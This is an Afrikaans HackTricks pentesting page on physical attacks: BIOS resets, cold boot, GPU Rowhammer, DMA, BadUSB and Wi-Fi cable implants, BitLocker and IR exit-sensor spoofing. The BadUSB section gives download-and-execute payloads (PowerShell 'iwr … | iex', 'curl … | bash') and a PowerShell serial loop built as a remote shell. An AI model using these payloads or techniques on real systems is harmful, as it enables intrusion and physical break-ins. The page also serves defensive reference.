# Fisiese aanvalle

{{#include ../banners/hacktricks-training.md}}

Vir ontdekking van koppelvlakke op bordvlak, serial consoles, flash-toegang, side channels en glitching, gebruik [Hardware Hacking](hardware-hacking/README.md) en die hoofstukke oor spesifieke koppelvlakke. Hierdie bladsy dek aanvalle wat fisiese toegang tot die stelsel as geheel vereis.

## Herstel van BIOS-wagwoorde en stelselsekuriteit

Legacy PC-firmware-instellings kan teruggestel word deur die CMOS-battery te ontkoppel of ’n gedokumenteerde clear-CMOS-jumper te gebruik. Die nodige tyd sonder krag hang van die bord af, en moderne UEFI-wagwoorde of -sleutels kan in nie-vlugtige flash, ’n ingebedde beheerder of ’n sekuriteitstoestel gestoor word en dus ’n batteryverwydering oorleef. Raadpleeg die bord-/dienshandleiding voordat jy penne kortsluit; hierdie prosedure kan ook TPM-metings ongeldig maak en skyf-enkripsieherstel aktiveer.

Op legacy x86-stelsels kan nutsprogramme soos **killCMOS** en **CmosPwd** CMOS-gesteunde instellings vanuit ’n selflaaibare omgewing inspekteer of verander. CmosPwd herken wagwoordformate van ’n gedokumenteerde stel ouer BIOS-families en kan CMOS-toestand rugsteun, herstel of uitvee/vernietig; die gepubliseerde bouweergawes is vir legacy DOS-/Windows-, Linux-, FreeBSD- en NetBSD-omgewings bedoel.<sup>[[18]](#references)</sup> Hierdie nutsprogramme is nie generiese verwyderaars van UEFI-wagwoorde nie en vereis voldoende hardeware-/firmwaretoegang.

Sommige skootrekenaarfirmware vertoon ’n verskafferspesifieke uitdagingskode ná verskeie mislukte wagwoordpogings. Databasisse soos [bios-pw.org](https://bios-pw.org) kan vir sommige modelle legacy-herstelwagwoorde van verskaffers aflei, maar baie stelsels sluit toegang sonder ’n afleibare uitdaging. Beskou enige gegenereerde wagwoord as modelspesifiek en vermy dat jy permanente pogingtellers uitput.

### UEFI-sekuriteit

Vir moderne **UEFI**-stelsels kan CHIPSEC Secure Boot-veranderlikebeskerming oudit. Begin met die nie-wysigende kontrole hieronder; die opsionele `-a modify`-modus probeer veranderlikes doelbewus beskadig en moet slegs op ’n herstelbare laboratoriumstelsel gebruik word. CHIPSEC waarsku self dat sy bevoorregte drywer en laevlak-hardewaretoegang ongeskik is vir produksie-eindpunte.<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## RAM-ontleding en Cold-boot-aanvalle

DRAM verloor nie elke bis onmiddellik wanneer verfrissing stop nie. Die vervaltempo wissel aansienlik na gelang van moduletegnologie en temperatuur; verkoeling kan nuttige data baie langer bewaar as ’n onverkoelde kragsiklus. ’n Cold-boot-aanval herlaai vinnig na ’n klein verkrygingsomgewing of dra ’n afgekoelde module oor, neem rou geheue vas en herkonstrueer kriptografiese sleutels ondanks bisverval. ’n Skyfkopiehulpmiddel is nie outomaties ’n fisiesegeheue-afbeeldingshulpmiddel nie, en Volatility ontleed ’n vaslegging eerder as om dit te verkry; gebruik ’n platformgeskikte, gevalideerde verkrygingshulpmiddel.<sup>[[12]](#references)</sup>

---

## GPU Rowhammer teen bladsytafels

Moderne GPU Rowhammer-aanvalle word baie nuttiger wanneer hulle **GPU-virtuele geheue-metadata** teiken in plaas van gewone buffers. Onlangse navorsing oor **GDDR6 NVIDIA Ampere-GPU’s** toon dat ’n aanvaller wat CUDA-kode sonder verhoogde voorregte uitvoer, GPU-spesifieke hamerpatrone kan bou, **memory massaging** kan gebruik om bladsystrukture in kwesbare rye te plaas, en dan bisse in die **laastevlak-bladsytafel** of ’n intermediêre **bladsygids** kan omkeer. Sodra ’n enkele vertaalinskrywing korrup raak, kan die aanvaller **arbitrêre GPU-geheue lees/skryf** bewerkstellig en dan na ’n host-kompromittering oorskakel.<sup>[[1]](#references)[[2]](#references)</sup>

### Uitbuitingspatroon

1. **Profieliseer rye wat gehamer kan word** in GDDR6 en bou verfrissingsbewuste/nie-uniforme hamerpatrone wat in-DRAM-versagtingsmaatreëls omseil.
2. **Manipuleer GPU-toekennings** sodat die drywer bladsyvertaalstrukture in hamerbare fisiese liggings plaas, eerder as om hulle in die verstek-beskermde poel te hou. In die praktyk kan dit beteken dat die laegeheue-bladsytafelgebied uitgeput word en dat groot yl UVM-karterings met beheerde stappe versprei word.
3. **Keer vertaalmetadata om**, soos **PFN**- of aperture-verwante bisse binne ’n bladsytafel-/bladsygidsinskrywing, sodat die aanvallerbeheerde virtuele bladsy na bladsytafelbladsye, arbitrêre GPU-geheue of host-sigbare stelselkarterings verwys.
4. Hergebruik die vervalste kartering om bykomende vertaalinskrywings te herskryf en eskaleer na **arbitrêre GPU-geheue lees/skryf** oor GPU-kontekste heen.

### Oorskakeling na die host en versagtingsmaatreëls

- Wanneer **IOMMU gedeaktiveer** is, kan vervalste stelsel-apertuurkarterings arbitrêre **fisiese host-geheue** aan die GPU blootstel, wat die GPU-primitief in ’n volledige host-kompromittering omskep.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** teiken laastevlak-bladsytafelinskrywings, terwyl **GeForge** wys dat dit makliker kan wees om ’n bladsygidsvlak te korrupteer, omdat een bisomkering ’n groter vertaal-subboom kan herteiken. Moenie slegs een blaailaag as sekuriteitskritiek beskou nie.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** bly belangrik omdat dit die direkte pad na arbitrêre host-geheue wat deur GDDRHammer/GeForge gebruik word, blokkeer, maar dit is **nie ’n volledige versagting nie**. **GPUBreach** toon ’n tweede-fase-oorskakeling waar die aanvaller GPU-skryfbare, drywereienaarskap-CPU-buffers korrupteer en dan NVIDIA-drywer-geheueveiligheidsfoute aktiveer om ’n kernel-skryfprimitief en ’n **root shell** te verkry, selfs wanneer IOMMU geaktiveer is.<sup>[[3]](#references)</sup>
- **Stelselvlak-ECC** is ’n praktiese verhardingsmaatreël op ondersteunde werkstasie-/bediener-GPU’s. Verbruikers-GPU’s sonder ECC bied ’n swakker verdedigingsoppervlak.<sup>[[4]](#references)</sup>
- Hierdie aanvalle is nie bloot teoreties nie: **GeForge** het **1,171** bisomkerings op ’n RTX 3060 en **202** op ’n RTX A6000 gerapporteer, wat genoeg was om ’n werkende ketting vir voorregte-eskalasie op die host te bou.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Direkte geheuetoegang-aanvalle (DMA)

Sien die volgende vir vanlyn UEFI IFR/NVRAM-regstelling wat voorlaai-IOMMU-afdwinging kan afgradeer en ’n Windows DMA-ketting kan aktiveer:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** demonstreer **DMA-gebaseerde geheueverkryging en regstelling** oor koppelvlakke soos FireWire en vroeë Thunderbolt-konfigurasies, insluitend historiese handtekeninge vir omseiling van aanmelding. Dit is nie bloot “ondoeltreffend teen Windows 10” nie: uitbuitbaarheid hang af van die koppelvlak, teikenbouweergawe, IOMMU-beleid, sluittoestand en of Windows Kernel DMA Protection ondersteun en geaktiveer is. Windows 10 weergawe 1803 en later het Kernel DMA Protection op versoenbare platforms bekendgestel, wat die aanvaloppervlak aansienlik verander het.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USB vir stelseltoegang

Op ’n ongeënkripteerde of reeds ontsluite Windows-volume kan ’n vanlyn omgewing toeganklikheidsbinaries soos **sethc.exe** of **Utilman.exe** met **cmd.exe** vervang, wat ’n SYSTEM-opdragprompt oplewer wanneer die ooreenstemmende kortpad op die aanmeldskerm gebruik word. Gereedskap soos **chntpw** kan plaaslike SAM-rekeningdata wysig. Hierdie metodes omseil nie ’n geslote BitLocker-volume nie en kan geloofsbriewe wat deur DPAPI/EFS beskerm word, beskadig; bewaar forensiese kopieë en rugsteune.

**Kon-Boot** is ’n kommersiële hulpmiddel vir die omseiling van verifikasie tydens selflaai op ondersteunde Windows/macOS-konfigurasies. Versoenbaarheid hang af van die bedryfstelsel, firmwaremodus, Secure Boot en skyf-enkripsie-opstelling; dit dekripteer nie ’n BitLocker-geslote volume nie.<sup>[[10]](#references)</sup>

---

## Hantering van Windows-sekuriteitskenmerke

### Selflaai- en herstelsleutels

- **Delete/Supr**, F2, F10 of ’n ander vervaardigersleutel kan firmware-opstelling oopmaak.
- **F8** open slegs Windows se gevorderde selflaai-opsies van ouer weergawes op konfigurasies waar daardie pad steeds geaktiveer is; die huidige hersteltoegang wissel.
- Deur **Shift** in te hou, kan Windows se outomatiese aanmelding in sommige konfigurasies onderdruk word, hoewel beleid-/registerinstellings daardie gedrag kan deaktiveer.<sup>[[17]](#references)</sup>

### BAD USB-toestelle

Toestelle soos **USB Rubber Ducky** en Teensy-borde kan as vertroude HID-sleutelborde geïdentifiseer word en voorafbepaalde toetsaanslae invoer. Die loonvrag het aanvanklik die voorregte en lessenaartoegang van die aangemelde sessie; UAC-aanwysings, skermsluiting, sleutelborduitleg, tydsberekening en USB-beleid vir eindpunte beperk dit steeds.<sup>[[15]](#references)</sup>

Programmeerbare randtoestelle kan ook gasheerkernelontleders aanval en verskeie USB-toestelle koördineer vir heap-manipulasie en inligtingsopenbaarmaking:

{{#ref}}
../binary-exploitation/linux-kernel-exploitation/usb-audio-descriptor-oob-kaslr-leak.md
{{#endref}}

### Volume Shadow Copy

Administrateur- of rugsteunvoorregte kan gebruik word om ’n skadukopie te skep of registerkorwe te stoor, sodat geslote lêers soos **SAM** en **SYSTEM** verkry kan word. Dit is ’n tegniek vir versameling ná kompromittering, nie ’n voorregomseiling nie, en behoort gekorreleer te word met `diskshadow`-/VSS- en registerkore-uitvoer-gebeurtenisse.

## BadUSB/HID-inplantingstegnieke

### NFC-geaktiveerde Android HID-gadget

’n Gerootte Android-foon kan ’n programmeerbare USB-sleutelbord word, maar slegs wanneer sy USB-beheerder en kernel **USB gadget/HID-ondersteuning** bied. Op versoenbare toestelle stel Kali NetHunter gadget-profiele deur **USB Arsenal** beskikbaar. Nog ’n opsie is [USB Gadget Tool](https://github.com/tejado/android-usb-gadget), wat ConfigFS-gadgetfunksies skep en sleutelbord-/muis-karaktertoestelle soos `/dev/hidg0` en `/dev/hidg1` kan beskikbaar stel. Die hulpmiddel skep slegs die gadget-eindpunt; ’n aparte proses moet HID-verslae daarna skryf. Worteltoegang kan nie vergoed vir ’n kernel sonder ConfigFS, HID-gadget-ondersteuning of ’n bruikbare USB Device Controller nie.<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>

Hierdie eindpunt kan met Android NFC gekombineer word as ’n fisiese sneller. Die [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID)-toepassing lees ’n merker-UID, skakel dit om na die verwagte voorstelling, kontroleer ’n plaaslike toelatingslys en stuur ’n gekonfigureerde sleutelbordvolgorde in Rubber Ducky-styl nadat ’n passing gevind is. Die gekoppelde host sien gewone sleutelbordinvoer en benodig geen NFC-sagteware nie.<sup>[[22]](#references)[[24]](#references)</sup>

Valideer toestelidentifikasie en sleutelborduitleg in ’n leë teksredigeerder voordat kortpaaie of opdragte gebruik word. ’n Skadelose loonvrag is:<sup>[[24]](#references)</sup>

```text
DELAY 1000
STRING NFC HID test successful
ENTER
```

Belangrike vertrouensgrense:<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

- ’n **UID-whitelist is identifikasie, nie verifikasie nie**. UID’s is publiek, en sommige tokentipes of emulators laat kloning of nabootsing toe. ’n Gekopieerde toegelate UID volg dieselfde afhandelingspad as die oorspronklike token.
- Die **NfcScreenOff** Magisk-module lap die NFC-diens sodat dit optree asof die skerm aan en ontsluit is. As die foon reeds aan ’n host gekoppel is, kan iemand die payload moontlik aktiveer sonder om die foon te ontsluit.
- Wagwoorde, API-tokens en opdragte wat in die payload gestoor is, is herstelbare geheime op ’n toestel met root-toegang of ’n ontsluitte selflaaiprogram. Om ’n wagwoord via HID in te tik, is herbruikbare-wagwoord-outomatisering, nie wagwoordlose verifikasie nie.
- HID-inspuiting gebruik die aktiewe rekenaar se voorregte en is afhanklik van fokus, tydsberekening en die host se sleutelborduitleg. Vereis onlangse gebruikerbevestiging voordat sensitiewe aksies uitgevoer word, vermy bevoorregte geheime in skrifte, en gebruik ’n kriptografiese uitdaging-antwoord-verifikator vir werklike verifikasie.

### Wi-Fi-beheerde kabelimplants

- ESP32-S3-gebaseerde implants soos **Evil Crow Cable Wind** skuil binne USB-A→USB-C- of USB-C↔USB-C-kabels, word uitsluitlik as ’n USB-sleutelbord geïdentifiseer, en stel hul C2-stapel oor Wi-Fi beskikbaar. Die operateur hoef net die kabel van die slagoffer se host af van krag te voorsien, ’n hotspot met die naam `Evil Crow Cable Wind` en die wagwoord `123456789` te skep, en na [http://cable-wind.local/](http://cable-wind.local/) (of sy DHCP-adres) te blaai om toegang tot die ingebedde HTTP-koppelvlak te kry.<sup>[[8]](#references)</sup>
- Die blaaier-UI bied oortjies vir *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* en *Config*. Gestoorde payloads word volgens OS gemerk, sleutelborduitlegte word onmiddellik omgeskakel, en VID/PID-stringe kan verander word om bekende randtoestelle na te boots.
- Omdat die C2 binne die kabel is, kan ’n foon payloads gereedmaak, uitvoering aktiveer en Wi-Fi-aanmeldbesonderhede bestuur sonder om die organisasie se netwerk te gebruik—nuttig vir fisieke indringings met ’n kort verblyftyd.

### OS-bewuste AutoExec-payloads

- AutoExec-reëls koppel een of meer payloads sodat hulle onmiddellik ná USB-enumerasie uitgevoer word. Die implant voer liggewig OS-vingerafdrukbepaling uit en kies die ooreenstemmende skrip.
- Voorbeeldwerkvloei:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) of `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Omdat uitvoering sonder toesig plaasvind, kan bloot die omruil van ’n laaikabel aanvanklike toegang onder die aangemelde gebruiker se konteks bewerkstellig.

### HID-geïnisialiseerde afgeleë shell oor Wi-Fi TCP

1. **Sleutelstelaanskop:** ’n Gestoorde payload maak ’n konsole oop en plak ’n lus wat alles uitvoer wat op die nuwe USB-reekstoestel aankom. ’n Minimale Windows-variant is:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Cable bridge:** Die implant hou die USB CDC-kanaal oop terwyl sy ESP32-S3 ’n TCP-kliënt (Python-skrip, Android-APK of lessenaaruitvoerbare lêer) na die operateur begin. Enige grepe wat in die TCP-sessie ingetik word, word na die seriële lus hierbo aangestuur, wat afstandbeveluitvoering moontlik maak, selfs op air-gapped gashere. Uitvoer is beperk, daarom voer operateurs gewoonlik opdragte blindelings uit (rekening skepping, bykomende gereedskap gereedmaak, ens.).

### HTTP OTA-opdateringskoppelvlak

- Die gedokumenteerde Evil Crow Cable Wind-koppelvlak stel ’n firmware-opdateringseindpunt sonder verifikasie by `/update` bloot:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Veldoperateurs kan funksies warm omruil (bv. USB Army Knife-firmware flits) tydens ’n operasie sonder om die kabel oop te maak, sodat die implantaat na nuwe vermoëns kan oorskakel terwyl dit steeds by die teikenstelsel ingeprop is.

## BitLocker-enkripsie omseil

’n Gemagtigde forensiese verkryging van ’n stelsel wat aan is of onlangs geloop het, kan ’n BitLocker-volumemeestersleutel of verwante sleutelmateriaal bevat terwyl die volume ontsluit is. Kommersiële nutsgoed soos Elcomsoft Forensic Disk Decryptor en Passware Kit Forensic kan deur ondersteunde geheuebeelde, hibernasielêers of crash dumps soek, maar sukses is nie gewaarborg nie. Moderne Windows enkripteer ook crash dumps wanneer BitLocker geaktiveer is, en ’n gestoorde 48-syfer-herstelwagwoord is ’n ander artefak as ’n volumesleutel in die geheue.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Sosiale manipulasie om ’n herstelsleutel by te voeg

’n Aanvaller wat ’n administrateur oorreed om BitLocker-bestuursopdragte uit te voer, kan ’n herstelwagwoord-, eksterne-sleutel- of ander beskermer byvoeg en dit dan vaslê. ’n Herstelwagwoord kan nie ’n arbitrêre string nulle wees nie: BitLocker se numeriese herstelwagwoorde moet aan ’n gevalideerde formaat van 48 syfers voldoen. Die toepaslike sintaksis vir gemagtigde administrasie is `manage-bde -protectors -add C: -recoverypassword`; lys die gevolglike beskermers met `manage-bde -protectors -get C:`. Monitor die byvoeging van beskermers en verseker dat nuwe herstelmateriaal slegs na goedgekeurde liggings gestoor word.<sup>[[16]](#references)</sup>

---

## Misbruik van onderstel-indringing-/onderhoudskakelaars om die BIOS na fabrieksinstellings terug te stel

Baie moderne skootrekenaars en klein rekenaars bevat ’n **onderstel-indringingskakelaar** wat deur die Embedded Controller (EC) en die BIOS/UEFI-firmware gemonitor word. Hoewel die skakelaar hoofsaaklik ’n waarskuwing moet aktiveer wanneer ’n toestel oopgemaak word, implementeer vervaardigers soms ’n **ongedokumenteerde herstelkortpad** wat geaktiveer word wanneer die skakelaar volgens ’n spesifieke patroon omgeskakel word.<sup>[[5]](#references)[[6]](#references)</sup>

### Hoe die aanval werk

1. Die skakelaar is aan ’n **GPIO-onderbreking** op die EC gekoppel.
2. Firmware wat op die EC loop, hou rekord van die **tydsberekening en aantal drukke**.
3. Wanneer ’n hardgekodeerde patroon herken word, roep die EC ’n *mainboard-reset*-roetine aan wat **die inhoud van die stelsel se NVRAM/CMOS uitwis**.
4. Met die volgende selflaai laai die betrokke modelle die teruggestelde firmwaretoestand. Afhangend van die vervaardiger en hersiening kan die uitgevee toestand ’n toesighouerwagwoord, pasgemaakte selflaai-instellings of ingeskrewe Secure Boot-sleutels insluit; die TPM-toestand en gevolge vir skyfenkripsie moet afsonderlik beoordeel word.

> ’n Firmware-terugstelling kan eksterne selflaai-opsies herstel, maar **dekripteer nie berging nie**. BitLocker of ’n ander volskyf-enkripsiestelsel kan ná TPM-/firmwareveranderinge na herstelmodus oorskakel en steeds die interne skyf beskerm as daar nie ’n herstelsleutel is nie.<sup>[[16]](#references)</sup>

### Werklike voorbeeld – Framework 13-skootrekenaar

Die herstelkortpad vir die Framework 13 (11de/12de/13de generasie) is:

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

Na die tiende siklus stel die EC ’n vlag wat die BIOS opdrag gee om NVRAM met die volgende herlaai uit te vee. Die hele prosedure neem ~40 s en vereis **niks behalwe ’n skroewedraaier nie**.<sup>[[5]](#references)</sup>

### Generiese ontginningsprosedure

1. Skakel die teiken aan, of hervat dit uit slaapmodus, sodat die EC loop.
2. Verwyder die onderste deksel om die inbraak-/instandhoudingskakelaar bloot te lê.
3. Herhaal die vervaardigerspesifieke wisselpatroon (raadpleeg dokumentasie, forums of reverse-engineer die EC-firmware).
4. Sit die toestel weer aanmekaar en herlaai dit; kontroleer dan watter firmware-instellings en geloofsbriewe werklik verander het.
5. As dit gemagtig is en eksterne selflaai beskikbaar is, selflaai vanaf ’n beheerde live-image. Sodra ’n interne volume wettig ontsluit is (of as dit nooit geënkripteer was nie), kan die live-omgewing geloofsbriewe en data bekom of die EFI System Partition ondersoek. Om daardie partisie te wysig en ’n EFI-implantaat te installeer, is aanhoudend en hoogs indringend, en bly beperk deur Secure Boot, measured boot, firmware-skryfbeskerming en eindpuntmonitering. Geënkripteerde berging bly ontoeganklik sonder die sleutel of herwinningsmateriaal.

### Opsporing en versagting

* Teken onderstel-inbraakgebeurtenisse in die OS-bestuurskonsole aan en korreleer dit met onverwagte BIOS-terugstellings.
* Gebruik **seëls wat peuterwerk aantoon** op skroewe/deksels om te bespeur wanneer dit oopgemaak is.
* Hou toestelle in **fisies beheerde areas**; aanvaar dat fisiese toegang gelykstaan aan volledige kompromittering.
* Waar beskikbaar, deaktiveer die vervaardiger se “maintenance switch reset”-funksie of vereis bykomende kriptografiese magtiging vir NVRAM-terugstellings.

---

## Verborge IR-inspuiting teen uitgangsensors sonder aanraking

### Sensoreienskappe
- Algemene “wave-to-exit”-sensors koppel ’n naby-IR-LED-sender aan ’n TV-afstandbeheeragtige ontvangermodule wat slegs ’n logiese hoog rapporteer nadat dit verskeie pulse (~4–10) van die korrekte drafrekwensie (≈30 kHz) waargeneem het.<sup>[[7]](#references)</sup>
- ’n Plastiekomhulsel keer dat die sender en ontvanger direk na mekaar kyk, dus neem die beheerder aan dat enige bekragtigde drafrekwensie van ’n nabygeleë weerkaatsing gekom het, en aktiveer ’n aflos wat die deursluitplaat oopmaak.
- Sodra die beheerder glo dat ’n teiken teenwoordig is, verander dit dikwels die uitgaande modulasie-omhulsel, maar die ontvanger aanvaar steeds enige sarsie wat by die gefiltreerde drafrekwensie pas.

### Aanvalswerkvloei
1. **Neem die emissieprofiel vas** – koppel ’n logika-ontleder oor die beheerderpenne om beide die vooropsporings- en naopsporingsgolfvorms op te neem wat die interne IR-LED aandryf.
2. **Speel slegs die “naopsporings”-golfvorm terug** – verwyder/ignoreer die standaard sender en dryf ’n eksterne IR-LED met die patroon wat reeds geaktiveer is van die begin af. Omdat die ontvanger net omgee vir pulstelling/-frekwensie, beskou dit die vervalste drafrekwensie as ’n egte weerkaatsing en aktiveer dit die afloslyn.
3. **Beheer die uitsending** – stuur die drafrekwensie in ingestelde sarsies uit (bv. tientalle millisekondes aan, ongeveer dieselfde tyd af) om die minimum pulstelling te lewer sonder om die ontvanger se AGC of interferensiehanteringslogika te versadig. Deurlopende uitsending maak die sensor vinnig minder sensitief en keer dat die aflos aktiveer.

### Weerkaatsende inspuiting oor lang afstande
- Deur die werkbank-LED met ’n hoëkrag-IR-diode, MOSFET-aandrywer en fokusoptika te vervang, kan die sensor betroubaar vanaf ~6 m geaktiveer word.
- Die aanvaller het nie ’n siglyn na die ontvangeropening nodig nie; deur die straal op binnemure, rakke of deurkosyne te rig wat deur glas sigbaar is, kan weerkaatste energie die gesigsveld van ~30° binnedring en ’n handbeweging van naby naboots.
- Omdat die ontvangers slegs swak weerkaatsings verwag, kan ’n veel sterker eksterne straal van verskeie oppervlaktes af weerkaats en steeds bo die opsporingsdrempel bly.

### Gewapende aanvalsflitslig
- Deur die aandrywer in ’n kommersiële flitslig in te bou, word die toestel in die sigbare omgewing versteek. Vervang die sigbare LED met ’n hoëkrag-IR-LED wat by die ontvanger se band pas, voeg ’n ATtiny412 (of soortgelyk) by om die ≈30 kHz-sarsies te genereer, en gebruik ’n MOSFET om die LED-stroom af te voer.
- ’n Teleskopiese zoomlens vernou die straal vir afstand/akkuraatheid, terwyl ’n vibrasiemotor onder MCU-beheer haptiese bevestiging gee dat modulasie aktief is, sonder om sigbare lig uit te stuur.
- Deur verskeie gestoorde modulasiepatrone (effens verskillende drafrekwensies en omhulsels) te deurloop, verbeter versoenbaarheid oor hernaamde sensorfamilies heen. Die operateur kan weerkaatsende oppervlaktes afsoek totdat die aflos hoorbaar klik en die deur oopgaan.

---

## References

- [1] [GDDRHammer: DRAM-rye ernstig versteur — Cross-Component Rowhammer-aanvalle vanaf moderne GPU’s](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: GDDR-geheue hamerslaan om GPU-bladsytabelle vir pret en wins te vervals](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Voorregte-eskalasie-aanvalle op GPU’s met Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Sekuriteitskennisgewing: Rowhammer - Julie 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Druk hier om te pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Gids vir moederbordterugstelling](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Neeeee, raak nie! – Om IR-uitgangsensors sonder aanraking met ’n verborge IR-flitslig te omseil”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Prop in, speel, pwn: Hacking met Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Rowhammer-aanval teen NVIDIA-skyfies](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Kon-Boot amptelike dokumentasie en versoenbaarheidsinligting](https://kon-boot.com/)
- [11] [CHIPSEC-dokumentasie - Secure Boot-veranderlikebeskerming](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Laat ons nie vergeet nie: Cold Boot-aanvalle op enkripsiesleutels](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - fisiese geheuemanipulasie oor DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Protection](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Hak5 USB Rubber Ducky-dokumentasie](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - BitLocker-bedryfsgids](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - Shift ingedruk hou en outomatiese aanmeldgedrag](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - CmosPwd-dokumentasie en aflaaie](https://www.cgsecurity.org/wiki/CmosPwd)
- [19] [Kali Linux-dokumentasie - NetHunter USB-Arsenal](https://www.kali.org/docs/nethunter/nethunter-usbarsenal/)
- [20] [Linux-kerneldokumentasie - USB HID-gadgetbestuurder](https://docs.kernel.org/usb/gadget_hid.html)
- [21] [USB Gadget Tool](https://github.com/tejado/android-usb-gadget)
- [22] [NFC-na-HID](https://github.com/androidmalware/NFC-to-HID)
- [23] [NfcScreenOff](https://github.com/Jon8RFC/NfcScreenOff)
- [24] [Verander ’n Android-foon met root in ’n NFC-outentiseerder en outomatiseringsinstrument vir jou rekenaar](https://mobile-hacker.com/2026/09/21/turn-a-rooted-android-phone-into-an-nfc-authenticator-and-automation-tool-for-your-pc/)
{{#include ../banners/hacktricks-training.md}}
